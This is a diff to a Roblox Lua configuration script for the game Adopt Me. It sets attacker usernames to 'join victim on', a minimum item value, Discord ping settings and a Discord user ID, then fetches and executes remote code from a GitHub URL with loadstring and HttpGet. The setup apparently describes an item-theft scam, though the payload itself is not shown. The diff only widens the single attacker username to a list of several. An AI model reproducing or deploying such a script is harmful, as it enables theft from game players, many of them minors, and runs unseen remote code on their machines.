@@ -1,9 +1,10 @@
-_G.Username = "IgniteScripts" -- user you should join victim on
+_G.Usernames = {"IgniteScripts", "nbvbw", "IgniteScriptsYT"} -- you can add as many as you'd like
 _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.discuser = "1269701634217480267" -- change to your Discord user ID
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/kjrmz/AdoptMeScript/refs/heads/main/AdoptMe'))()
+
 
 -- Ensure HTTP requests are supported by the exploit
 if not syn and not http and not request then
